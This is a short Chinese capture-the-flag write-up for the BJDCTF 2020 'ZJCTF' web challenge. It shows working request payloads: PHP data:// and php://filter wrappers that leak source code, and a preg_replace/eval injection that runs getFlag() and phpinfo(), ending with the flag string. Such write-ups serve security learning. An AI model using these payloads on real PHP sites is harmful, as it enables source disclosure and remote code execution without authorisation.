---
title: "Web 12 [BJDCTF 2020]ZJCTF，不过如此"
published: 2025-01-10
category: CTF
---

![](https://pic.npiter.de/file/1771550796591_20260220092634165.png)

涉及 PHP 伪协议。先看题目：

![](https://pic.npiter.de/file/1771550809468_20260220092634166.png)

条件：读取 `text` 的内容必须为 `I have a dream`，且 `file` 参数不能含有 `flag`。

## 构造 PHP 伪协议

```
/?text=data://plain/text,I%20have%20a%20dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

得到 base64 编码的源码：

![](https://pic.npiter.de/file/1771550811150_20260220092634167.png)

解码：

![](https://pic.npiter.de/file/1771550809125_20260220092634168.png)

## 发现命令执行漏洞

源码中有 `@eval($_GET['cmd']);`，构造：

```
/next.php?\S*=${getFlag()}&&cmd=phpinfo();
```

![](https://pic.npiter.de/file/1771550820153_20260220092634169.png)

## Ctrl+G 搜索 flag

在 phpinfo 页面中搜索 flag：

![](https://pic.npiter.de/file/1771550823995_20260220092634170.png)

**`NSSCTF{453a61d6-6601-4a35-bc99-2090d2f0a749}`**
